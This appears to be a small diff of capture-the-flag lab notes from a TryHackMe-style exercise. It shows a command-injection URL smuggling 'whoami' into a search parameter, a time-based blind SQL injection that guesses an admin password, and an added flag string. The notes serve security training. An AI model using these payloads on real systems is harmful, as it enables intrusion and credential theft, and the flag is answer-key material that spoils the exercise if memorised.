@@ -33,3 +33,5 @@ curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
 
 #SQLI
 https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4961';--
+
+THM{NmNlZTliNGE1MWU1ZTQzMzgzNmFiNWVk}
